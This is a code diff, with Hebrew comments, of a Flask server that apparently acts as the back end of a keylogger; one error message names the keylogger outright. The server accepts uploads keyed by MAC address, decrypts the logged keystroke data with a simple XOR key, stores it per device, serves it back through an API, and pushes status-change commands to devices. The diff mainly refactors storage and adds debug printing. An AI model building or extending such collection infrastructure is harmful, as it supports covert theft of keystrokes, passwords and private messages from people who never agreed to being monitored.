@@ -11,9 +11,8 @@ CORS(app)
 REQUIRED_FILES = {
     "device_status.json": [],
     "change_device_status.json": {},
-    "all_devices_data.json": {}  # קובץ מרכזי לכל נתוני ההאזנות
+    "all_devices_data.json": []  # שינוי לרשימה כמו בסטטוס
 }
-
 
 def ensure_files_exist():
     for file_name, default_data in REQUIRED_FILES.items():
@@ -24,7 +23,6 @@ def ensure_files_exist():
                 print(f"✅ נוצר קובץ ברירת מחדל: {file_name}")
             except Exception as e:
                 print(f"❌ שגיאה ביצירת קובץ {file_name}: {e}")
-
 
 def write_to_device_status(data):
     try:
@@ -49,56 +47,43 @@ def write_to_device_status(data):
             data_json.append(data)
         with open(file_path, "w", encoding="utf-8") as f:
             json.dump(data_json, f, ensure_ascii=False, indent=4)
+        print(f"✅ עדכון סטטוס נכתב ל-{file_path}")
     except Exception as e:
         print("❌ שגיאה בכתיבת device_status.json:", e)
 
-
 def write_to_device_data(data):
-    file_path = "all_devices_data.json"  # קובץ מרכזי לכל הנתונים
-    Mac_address = next(iter(data.keys()))
-    data = xor_decrypt_dict_list(data)
-
-    if not Mac_address:
-        print("❌ לא נשלח mac_address לעדכון קובץ")
-        return
-
     try:
+        file_path = "all_devices_data.json"
+        mac_address = next(iter(data.keys()))
+        print(f"🔍 נתונים לפני פענוח: {data}")
+        data_decrypted = xor_decrypt_dict_list(data)
+        print(f"🔍 נתונים אחרי פענוח: {data_decrypted}")
         if os.path.exists(file_path):
             with open(file_path, "r", encoding="utf-8") as file:
                 try:
-                    all_devices_data = json.load(file)
-                    if not isinstance(all_devices_data, dict):
-                        all_devices_data = {}
+                    data_json = json.load(file)
+                    if not isinstance(data_json, list):
+                        data_json = []
                 except json.JSONDecodeError:
-                    all_devices_data = {}
+                    data_json = []
         else:
-            all_devices_data = {}
-
-        if Mac_address not in all_devices_data:
-            all_devices_data[Mac_address] = []  # אתחול רשימה אם אין רשומה למק הזה
-
-        # הוספת הנתונים החדשים לרשימה של המק המתאים
-        all_devices_data[Mac_address].append(data[Mac_address])  # data כבר מפוענח ומוכן
-
-        with open(file_path, "w", encoding="utf-8") as file:
-            json.dump(all_devices_data, file, indent=4)
-
-        print(f"✅ הנתונים נוספו בהצלחה לקובץ {file_path} עבור MAC: {Mac_address}")
+            data_json = []
+        # הוספת הנתונים כרשומה חדשה עם ה-MAC והלוגים המפוענחים
+        data_to_save = {"mac_address": mac_address, "logs": data_decrypted[mac_address]}
+        data_json.append(data_to_save)
+        with open(file_path, "w", encoding="utf-8") as f:
+            json.dump(data_json, f, ensure_ascii=False, indent=4)
+        print(f"✅ נתונים נכתבו ל-{file_path} עבור MAC: {mac_address}")
     except Exception as e:
-        print("❌ שגיאה בכתיבת המידע לקובץ המרכזי:", e)
-
+        print("❌ שגיאה בכתיבת all_devices_data.json:", e)
 
 def xor_encrypt_decrypt(text):
-    """ מבצע XOR על מחרוזת ומחזיר מחרוזת של תווים """
     return ''.join(chr(ord(char) ^ 5) for char in text)
-
 
 def xor_decrypt_dict_list(data):
     processed_dict = {}
-
     mac_address, timestamps_data = next(iter(data.items()))
     processed_timestamps_data = {}
-
     for timestamp_key, dictionary_list in timestamps_data.items():
         processed_list = []
         for dictionary in dictionary_list:
@@ -111,12 +96,9 @@ def xor_decrypt_dict_list(data):
                 else:
                     processed_dict_entry[k] = v
             processed_list.append(processed_dict_entry)
-
         processed_timestamps_data[timestamp_key] = processed_list
-
     processed_dict[mac_address] = processed_timestamps_data
     return processed_dict
-
 
 def write_to_change_status(data):
     try:
@@ -135,9 +117,9 @@ def write_to_change_status(data):
         status_json[mac_address] = data
         with open(file_path, "w", encoding="utf-8") as f:
             json.dump(status_json, f, ensure_ascii=False, indent=4)
+        print(f"✅ שינויי סטטוס נכתבו ל-{file_path}")
     except Exception as e:
         print("❌ שגיאה בכתיבת change_device_status.json:", e)
-
 
 @app.route('/api/status/update', methods=['POST'])
 def status_update():
@@ -153,22 +135,23 @@ def status_update():
         print("❌ שגיאה בעדכון סטטוס מהקיי-לוגר:", e)
         return jsonify({"error": str(e)}), 500
 
-
 @app.route('/api/data/upload', methods=['POST'])
 def upload_data():
     print("📡 התחלת טיפול בבקשת העלאת נתוני מחשב מהאתר")
-    data = {request.headers.get("mac-address"): request.get_json()}
-    print(data)
+    mac_address = request.headers.get("mac-address")
+    if not mac_address:
+        return jsonify({"error": "Missing mac_address in headers"}), 400
+    data = {mac_address: request.get_json()}
+    print("🔍 נתונים שהתקבלו מהלקוח:", data)
     try:
-        if not data:
-            return jsonify({"error": "Invalid JSON or missing mac_address"}), 400
+        if not data or not data[mac_address]:
+            return jsonify({"error": "Invalid JSON or missing data"}), 400
         write_to_device_data(data)
         print("✅ נתוני מחשב מהאתר התקבלו:", data)
         return jsonify({"message": "Success"}), 200
     except Exception as e:
         print("❌ שגיאה בעדכון נתוני מחשב מהאתר:", e)
         return jsonify({"error": str(e)}), 500
-
 
 @app.route('/api/data/files', methods=['GET'])
 def get_device_logs():
@@ -177,34 +160,38 @@ def get_device_logs():
     if not mac_address:
         return jsonify({"error": "Missing mac_address in headers"}), 400
     try:
-        file_path = "all_devices_data.json"  # קריאה מהקובץ המרכזי
+        file_path = "all_devices_data.json"
         if os.path.exists(file_path):
             with open(file_path, "r", encoding="utf-8") as file:
-                all_logs = json.load(file)
-                device_logs = all_logs.get(mac_address, [])  # שליפת לוגים לפי מק, מחזיר רשימה ריקה אם אין
-                print(f"✅ לוגים שנשלחו עבור {mac_address}:", device_logs)
-                return jsonify(device_logs)  # מחזיר רשימה של לוגים
-        return jsonify([]), 200  # אם אין קובץ או אין לוגים למק, מחזיר רשימה ריקה
+                data_json = json.load(file)
+                if not isinstance(data_json, list):
+                    data_json = []
+            # סינון כל הרשומות לפי ה-MAC ומחזירים את הלוגים כרשימה
+            device_logs = [entry["logs"] for entry in data_json if entry.get("mac_address") == mac_address]
+            print("✅ לוגים שנשלחו עבור", mac_address, ":", device_logs)
+            return jsonify(device_logs)
+        print(f"⚠️ הקובץ {file_path} לא נמצא")
+        return jsonify([]), 200
     except Exception as e:
         print(f"❌ שגיאה בשליפת לוגים עבור {mac_address}:", e)
         return jsonify({"error": str(e)}), 500
-
 
 @app.route('/api/status/all', methods=['GET'])
 def get_status_all():
     print("📡 התחלת טיפול בבקשת שליפת סטטוסים לכל המכשירים מהאתר")
     try:
-        with open("device_status.json", "r", encoding="utf-8") as file:
+        file_path = "device_status.json"
+        with open(file_path, "r", encoding="utf-8") as file:
             data_json = json.load(file)
             if not isinstance(data_json, list):
                 data_json = []
             print("✅ סטטוסים שנשלחו אל הדף מהשרת:", data_json)
         return jsonify(data_json)
     except FileNotFoundError:
+        print(f"⚠️ הקובץ {file_path} לא נמצא")
         return jsonify([]), 200
     except json.JSONDecodeError:
         return jsonify({"error": "Invalid JSON file"}), 500
-
 
 @app.route('/api/status/check', methods=['GET'])
 def check_status():
@@ -227,13 +214,13 @@ def check_status():
             json.dump(status_json, file, ensure_ascii=False, indent=4)
         return jsonify(device_status)
     except FileNotFoundError:
+        print(f"⚠️ הקובץ {file_path} לא נמצא")
         return jsonify({"error": "Status file not found"}), 500
     except json.JSONDecodeError:
         return jsonify({"error": "Invalid JSON file"}), 500
     except Exception as e:
         print("❌ שגיאה בטיפול בבקשת /api/status/check:", e)
         return jsonify({"error": str(e)}), 500
-
 
 @app.route('/api/status/change', methods=['POST'])
 def change_status():
@@ -249,42 +236,30 @@ def change_status():
         print("❌ שגיאה בעדכון סטטוס מהאתר:", e)
         return jsonify({"error": str(e)}), 500
 
-
 @app.route('/api/files/list', methods=['GET'])
 def list_files():
     try:
-        # קבלת הספרייה הנוכחית שבה השרת רץ
         current_dir = os.getcwd()
-
-        # רשימת כל הפריטים בספרייה
         all_items = os.listdir(current_dir)
-
-        # סינון לרשימת קבצים בלבד (לא תיקיות) וקבלת פרטים
         files_info = []
         for item in all_items:
             item_path = os.path.join(current_dir, item)
-            if os.path.isfile(item_path):  # בדיקה שזה קובץ ולא תיקייה
-                file_size = os.path.getsize(item_path)  # גודל הקובץ בבייטים
+            if os.path.isfile(item_path):
+                file_size = os.path.getsize(item_path)
                 files_info.append({
                     "name": item,
                     "size_bytes": file_size
                 })
-
-        # הדפסה ללוג של השרת (נראה בקונסולה של Render)
         print(f"📂 קבצים בספרייה הנוכחית ({current_dir}):")
         for file in files_info:
             print(f"  - {file['name']}: {file['size_bytes']} בייטים")
-
-        # החזרת התגובה כ-JSON ללקוח
         return jsonify({
             "files": files_info,
             "total_files": len(files_info)
         }), 200
-
     except Exception as e:
         print(f"❌ שגיאה ברשימת הקבצים: {e}")
         return jsonify({"error": str(e)}), 500
-
 
 if __name__ == '__main__':
     ensure_files_exist()
